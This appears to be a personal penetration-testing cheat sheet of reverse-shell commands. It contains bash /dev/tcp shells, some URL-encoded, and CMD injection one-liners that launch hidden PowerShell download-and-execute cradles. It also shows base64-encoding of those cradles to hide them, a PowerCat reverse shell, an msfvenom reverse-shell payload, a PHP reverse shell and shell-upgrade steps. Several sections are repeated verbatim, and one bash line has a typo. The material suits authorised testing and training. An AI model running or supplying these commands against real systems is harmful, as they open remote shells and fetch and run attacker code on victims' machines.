---
title: Reverse Shells
updated: 2025-05-12 01:00:37Z
created: 2025-04-18 11:39:51Z
latitude: -33.78668940
longitude: 150.95264980
altitude: 0.0000
---

Start a Netcat reverse shell:
`nc -nvlp <port>`

Start Web Server using python3
`python3 -m http.server <port>`

* * * 
## Bash
`bash -i >& /dev/tcp/<target>/<port> 0>&1`
`bash -c "bash -i >& /dev/tcp/<target>/<port> 0)&1"` 
**URL Encoded:**
`bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<target>%2F<port>%200%3E%261%22`

* * *
## CMD
Inject anything (eg **calc**):
`for /f "delims=" %i in ('dir 2^>^&1 *^|echo powershell -w hidden -nop -c calc') do @%i`

Inject reverse shell (**ps1**):
`for /f "delims=" %i in ('dir 2^>^&1 *^|echo powershell -w hidden -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://kali/payload.ps1')"') do @%i`

Wrap in a one-liner for batch file (**.bat**)
```
@echo off
for /f "delims=" %%i in ('dir 2^>^&1 *^|echo calc') do %%i
```

* * *
## PowerShell
**Base64 Encode PowerShell Commands**

1. Build your PowerShell command:
`IEX(New-Object Net.WebClient).DownloadString('http://kali/shell.ps1')`
2. Convert to **Base64** (PowerShell expects UTF-16LE)
```
$cmd = "IEX(New-Object Net.WebClient).DownloadString('http://kali/shell.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
[Convert]::ToBase64String($bytes)
```
3. Drop it in your payload:
`Invoke-Expression "powershell -nop -w hidden -enc XXXXXXXXXXXXXXX"`
* * *

**PowerCat**
. 1. `cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 /scripts/reverse_shells/powercat.ps1`
2. Start HTTP server to host the powercat script:
`python3 -m http.server 80`
3. Start a netcat listener
`nc -nvlp <port>`
4. Execute the script:
```
IEX (New-Object System.Net.Webclient).DownloadString ("http://<kali>/powercat.ps1");
powercat -c <kali> -p <port> -e powershell
```

# Generate Reverse Shell for buffer-overflow payload
1. For access to a windows host or file system
`msfvenom -p windows/shell_reverse_tcp LHOST=<HackerIP> LPORT=666 -f python -b '\x00'`


# Upgrading Shell
If linux shell comes back with no tty escape
`python -c 'import pty; pty.spawn("/bin/bash")'`
`python3 -c 'import pty;pty.spawn("/bin/bash")'`

`CTRL-Z` to put process in backgroup
`stty raw -echo`
`fg`
`fg`
`export TERM=xterm`

# PHP Reverse Shell - 1 liner
`php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`

# TTY Escape
`python3 -c 'import pty; pty.spawn("/bin/sh")'`

(inside the nc session) 
**CTRL+Z**
**stty raw -echo**
**fg**
**ls**
**export SHELL=/bin/bash**
**export TERM=screen**
**stty rows 38 columns 116**
**reset**

# PowerShell reverse shell

```
echo 'Invoke-PowerShellTcp -Reverse -IPAddress <kali> -Port 443' >>
Invoke-PowerShellTcp.ps1
```
`python3 -m http.server 80`

On target:
```
powershell -c iex(new-object net.webclient).downloadstring('http://<kali>/Invoke-PowerShellTcp.ps1’)
```


* * * 
## Bash
`bash -i >& /dev/tcp/<target>/<port> 0>&1`
`bash -c "bash -i >& /dev/tcp/<target>/<port> 0)&1"` 
**URL Encoded:**
`bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<target>%2F<port>%200%3E%261%22`

* * *
## CMD
Inject anything (eg **calc**):
`for /f "delims=" %i in ('dir 2^>^&1 *^|echo powershell -w hidden -nop -c calc') do @%i`

Inject reverse shell (**ps1**):
`for /f "delims=" %i in ('dir 2^>^&1 *^|echo powershell -w hidden -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://kali/payload.ps1')"') do @%i`

Wrap in a one-liner for batch file (**.bat**)
```
@echo off
for /f "delims=" %%i in ('dir 2^>^&1 *^|echo calc') do %%i
```

* * *
## PowerShell
**Base64 Encode PowerShell Commands**

1. Build your PowerShell command:
`IEX(New-Object Net.WebClient).DownloadString('http://kali/shell.ps1')`
2. Convert to **Base64** (PowerShell expects UTF-16LE)
```
$cmd = "IEX(New-Object Net.WebClient).DownloadString('http://kali/shell.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
[Convert]::ToBase64String($bytes)
```
3. Drop it in your payload:
`Invoke-Expression "powershell -nop -w hidden -enc XXXXXXXXXXXXXXX"`
* * *

**PowerCat**
. 1. `cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 /scripts/reverse_shells/powercat.ps1`
2. Start HTTP server to host the powercat script:
`python3 -m http.server 80`
3. Start a netcat listener
`nc -nvlp <port>`
4. Execute the script:
```
IEX (New-Object System.Net.Webclient).DownloadString ("http://<kali>/powercat.ps1");
powercat -c <kali> -p <port> -e powershell
```



